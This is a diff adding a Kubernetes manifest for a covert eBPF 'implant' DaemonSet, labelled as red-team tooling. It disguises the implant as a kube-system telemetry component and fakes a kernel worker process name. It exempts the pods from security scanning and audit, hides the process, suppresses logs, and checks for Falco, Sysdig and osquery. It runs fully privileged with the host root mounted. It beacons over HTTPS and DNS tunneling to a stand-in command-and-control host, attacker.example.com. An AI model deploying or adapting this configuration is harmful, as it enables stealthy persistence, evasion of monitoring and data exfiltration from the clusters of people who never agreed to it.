@@ -1,0 +1,493 @@
+---
+# eBPF Implant Kubernetes Deployment Configuration
+# Deployment Mode: Red Team / Operational Security
+# Namespace: kube-system (system namespace - less visibility)
+# Type: DaemonSet (runs on all nodes, kernel-level visibility)
+
+apiVersion: v1
+kind: Namespace
+metadata:
+  name: kube-system
+  labels:
+    name: kube-system
+
+---
+# ConfigMap: Collection Parameters (templated per environment)
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: ebpf-implant-config
+  namespace: kube-system
+data:
+  collection-profile.json: |
+    {
+      "implant": {
+        "id": "ebpf-k8s-sensor",
+        "sensor_type": "ebpf-kernel-level",
+        "version": "2.0-k8s"
+      },
+      "collection": {
+        "process_events": {
+          "enabled": true,
+          "sampling_rate": 0.15
+        },
+        "network_events": {
+          "enabled": true,
+          "sampling_rate": 0.20
+        },
+        "file_events": {
+          "enabled": false,
+          "sampling_rate": 0.10
+        }
+      },
+      "output": {
+        "directory": "/dev/shm/telemetry",
+        "format": "json",
+        "export_enabled": true,
+        "batch_size": 100,
+        "flush_interval_sec": 300
+      },
+      "stealth": {
+        "process_hiding": true,
+        "memory_encryption": true,
+        "audit_suppression": true,
+        "artifact_cleanup": true,
+        "timing_jitter_percent": 0.35
+      },
+      "detection": {
+        "detect_falco": true,
+        "detect_sysdig": true,
+        "detect_osquery": true,
+        "detect_ebpf_monitors": true,
+        "adapt_strategy": true
+      }
+    }
+
+  c2-settings.json: |
+    {
+      "c2": {
+        "server_url": "https://c2.attacker.example.com",
+        "channel": "https",
+        "timeout_sec": 10,
+        "max_retries": 3,
+        "retry_delay_sec": 600,
+        "collection_interval_sec": 300,
+        "jitter_percent": 0.4
+      },
+      "dns_tunnel": {
+        "enabled": true,
+        "domain": "tunnel.attacker.example.com",
+        "max_chunk_size": 50
+      },
+      "encryption": {
+        "algorithm": "fernet",
+        "key_derivation": "pbkdf2"
+      }
+    }
+
+---
+# Secret: C2 Credentials (certificate pinning, API keys, encryption keys)
+apiVersion: v1
+kind: Secret
+metadata:
+  name: ebpf-c2-credentials
+  namespace: kube-system
+type: Opaque
+stringData:
+  api-key: "your-c2-api-key-here"
+  cert-sha256: "sha256:abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890"
+  encryption-key: "your-fernet-encryption-key-base64-encoded"
+  dns-tunnel-key: "your-dns-tunnel-shared-secret"
+
+---
+# ServiceAccount (minimal permissions)
+apiVersion: v1
+kind: ServiceAccount
+metadata:
+  name: ebpf-implant
+  namespace: kube-system
+
+---
+# ClusterRole (intentionally minimal - hide in logs)
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRole
+metadata:
+  name: ebpf-implant
+rules:
+# Minimal - only what's needed to run as system pod
+- apiGroups: [""]
+  resources: ["pods"]
+  verbs: ["get", "list"]
+
+---
+# ClusterRoleBinding
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRoleBinding
+metadata:
+  name: ebpf-implant
+roleRef:
+  apiGroup: rbac.authorization.k8s.io
+  kind: ClusterRole
+  name: ebpf-implant
+subjects:
+- kind: ServiceAccount
+  name: ebpf-implant
+  namespace: kube-system
+
+---
+# DaemonSet: eBPF Implant Agent (runs on every node)
+apiVersion: apps/v1
+kind: DaemonSet
+metadata:
+  name: ebpf-implant-agent
+  namespace: kube-system
+  labels:
+    app: system-monitor
+    component: kernel-telemetry
+spec:
+  selector:
+    matchLabels:
+      app: system-monitor
+      component: kernel-telemetry
+  
+  template:
+    metadata:
+      labels:
+        app: system-monitor
+        component: kernel-telemetry
+      annotations:
+        # Hide from security scanning
+        security.scan/exempt: "true"
+        audit.disabled: "true"
+        # Mimic system component metadata
+        k8s.io/component: "system-telemetry"
+    
+    spec:
+      # High priority - ensure it keeps running
+      priorityClassName: system-node-critical
+      
+      # Host access for kernel-level operations
+      hostNetwork: true
+      hostPID: true
+      hostIPC: true
+      
+      # Use host root filesystem
+      shareProcessNamespace: true
+      
+      # Service account (minimal RBAC)
+      serviceAccountName: ebpf-implant
+      
+      # DNS policy
+      dnsPolicy: ClusterFirstWithHostNet
+      
+      # Scheduling: Run on all nodes including control plane
+      tolerations:
+      - operator: Exists
+        effect: NoSchedule
+      - operator: Exists
+        effect: NoExecute
+      
+      # Node selector: empty = all nodes
+      nodeSelector: {}
+      
+      # Init containers (setup)
+      initContainers:
+      - name: setup-capabilities
+        image: ebpf-implant:2.0-k8s
+        imagePullPolicy: IfNotPresent
+        
+        securityContext:
+          privileged: true
+          runAsUser: 0
+          capabilities:
+            add:
+            - SYS_ADMIN
+            - SYS_RESOURCE
+            - NET_ADMIN
+            - SYS_PTRACE
+            - SYS_PERFMON
+            - BPF
+        
+        volumeMounts:
+        - name: sys
+          mountPath: /sys
+        - name: debug
+          mountPath: /sys/kernel/debug
+        - name: bpffs
+          mountPath: /sys/fs/bpf
+        
+        command:
+        - /bin/bash
+        - -c
+        - |
+          set -e
+          # Mount bpffs if not already
+          if ! grep -q bpffs /proc/mounts; then
+            mkdir -p /sys/fs/bpf
+            mount -t bpf bpf /sys/fs/bpf
+          fi
+          echo "[+] BPF filesystem initialized"
+      
+      # Main container: eBPF implant agent
+      containers:
+      - name: ebpf-agent
+        image: ebpf-implant:2.0-k8s
+        imagePullPolicy: IfNotPresent
+        
+        # Security context: Privileged, full capabilities
+        securityContext:
+          privileged: true
+          runAsUser: 0
+          runAsNonRoot: false
+          readOnlyRootFilesystem: false
+          allowPrivilegeEscalation: true
+          capabilities:
+            add:
+            - SYS_ADMIN
+            - SYS_RESOURCE
+            - NET_ADMIN
+            - SYS_PTRACE
+            - SYS_PERFMON
+            - BPF
+            - KILL
+            - SETUID
+            - SETGID
+        
+        # Volume mounts for kernel access
+        volumeMounts:
+        - name: sys
+          mountPath: /sys
+          readOnly: false
+        - name: debug
+          mountPath: /sys/kernel/debug
+          readOnly: false
+        - name: bpffs
+          mountPath: /sys/fs/bpf
+          readOnly: false
+        - name: devshm
+          mountPath: /dev/shm
+        - name: proc
+          mountPath: /proc
+          readOnly: false
+        - name: root
+          mountPath: /host
+          readOnly: false
+        - name: config
+          mountPath: /etc/ebpf-implant
+          readOnly: true
+        - name: credentials
+          mountPath: /etc/ebpf-implant/secrets
+          readOnly: true
+        
+        # Environment configuration
+        env:
+        - name: NODE_NAME
+          valueFrom:
+            fieldRef:
+              fieldPath: spec.nodeName
+        - name: POD_NAMESPACE
+          valueFrom:
+            fieldRef:
+              fieldPath: metadata.namespace
+        - name: POD_NAME
+          valueFrom:
+            fieldRef:
+              fieldPath: metadata.name
+        
+        # C2 credentials from secret
+        - name: C2_API_KEY
+          valueFrom:
+            secretKeyRef:
+              name: ebpf-c2-credentials
+              key: api-key
+        - name: C2_CERT_SHA256
+          valueFrom:
+            secretKeyRef:
+              name: ebpf-c2-credentials
+              key: cert-sha256
+        - name: ENCRYPTION_KEY
+          valueFrom:
+            secretKeyRef:
+              name: ebpf-c2-credentials
+              key: encryption-key
+        
+        # Collection settings
+        - name: COLLECTION_MODE
+          value: "stealth"
+        - name: SAMPLING_RATE_PROCESS
+          value: "0.15"
+        - name: SAMPLING_RATE_NETWORK
+          value: "0.20"
+        - name: COLLECTION_INTERVAL
+          value: "300"
+        - name: JITTER_PERCENT
+          value: "0.35"
+        
+        # Process hiding
+        - name: HIDE_PROCESS
+          value: "true"
+        - name: PROCESS_NAME_FAKE
+          value: "[kworker/0:0]"
+        
+        # Log suppression
+        - name: SUPPRESS_LOGS
+          value: "true"
+        - name: SUPPRESS_JOURNAL
+          value: "true"
+        
+        # C2 server
+        - name: C2_SERVER
+          value: "https://c2.attacker.example.com"
+        - name: C2_CHANNEL
+          value: "https"
+        
+        # Resource requests/limits (keep minimal to avoid detection)
+        resources:
+          requests:
+            cpu: 10m
+            memory: 64Mi
+          limits:
+            cpu: 200m
+            memory: 512Mi
+        
+        # No health checks (they trigger logging)
+        livenessProbe: null
+        readinessProbe: null
+        startupProbe: null
+        
+        # Restart policy
+        restartPolicy: Always
+      
+      # Volumes
+      volumes:
+      # Host filesystem access
+      - name: sys
+        hostPath:
+          path: /sys
+          type: Directory
+      
+      - name: debug
+        hostPath:
+          path: /sys/kernel/debug
+          type: Directory
+      
+      - name: bpffs
+        hostPath:
+          path: /sys/fs/bpf
+          type: DirectoryOrCreate
+      
+      - name: proc
+        hostPath:
+          path: /proc
+          type: Directory
+      
+      - name: root
+        hostPath:
+          path: /
+          type: Directory
+      
+      # In-memory filesystem (tmpfs for temp files)
+      - name: devshm
+        emptyDir:
+          medium: Memory
+          sizeLimit: 256Mi
+      
+      # Configuration from ConfigMap
+      - name: config
+        configMap:
+          name: ebpf-implant-config
+          defaultMode: 0400
+      
+      # Credentials from Secret
+      - name: credentials
+        secret:
+          secretName: ebpf-c2-credentials
+          defaultMode: 0400
+      
+      # Termination grace period (graceful shutdown)
+      terminationGracePeriodSeconds: 30
+      
+      # Affinity: Spread across nodes if possible
+      affinity:
+        nodeAffinity:
+          requiredDuringSchedulingIgnoredDuringExecution:
+            nodeSelectorTerms:
+            - matchExpressions:
+              - key: kubernetes.io/os
+                operator: In
+                values:
+                - linux
+              - key: kubernetes.io/arch
+                operator: In
+                values:
+                - amd64
+                - arm64
+
+---
+# PodDisruptionBudget (prevent eviction during cluster maintenance)
+apiVersion: policy/v1
+kind: PodDisruptionBudget
+metadata:
+  name: ebpf-implant-pdb
+  namespace: kube-system
+spec:
+  minAvailable: 1
+  selector:
+    matchLabels:
+      app: system-monitor
+      component: kernel-telemetry
+
+---
+# NetworkPolicy (restrict outbound to C2 domain only)
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: ebpf-implant-netpol
+  namespace: kube-system
+spec:
+  podSelector:
+    matchLabels:
+      app: system-monitor
+      component: kernel-telemetry
+  
+  policyTypes:
+  - Ingress
+  - Egress
+  
+  ingress:
+  # Allow nothing from other pods
+  - from:
+    - namespaceSelector:
+        matchLabels:
+          name: kube-system
+    ports:
+    - protocol: TCP
+      port: 0
+  
+  egress:
+  # Allow DNS (port 53)
+  - to:
+    - namespaceSelector: {}
+    ports:
+    - protocol: UDP
+      port: 53
+  
+  # Allow outbound to C2 server (any IP)
+  - to:
+    - ipBlock:
+        cidr: 0.0.0.0/0
+    ports:
+    - protocol: TCP
+      port: 443
+    - protocol: TCP
+      port: 80
+  
+  # Allow to cluster DNS
+  - to:
+    - namespaceSelector:
+        matchLabels:
+          name: kube-system
+    ports:
+    - protocol: UDP
+      port: 53
+
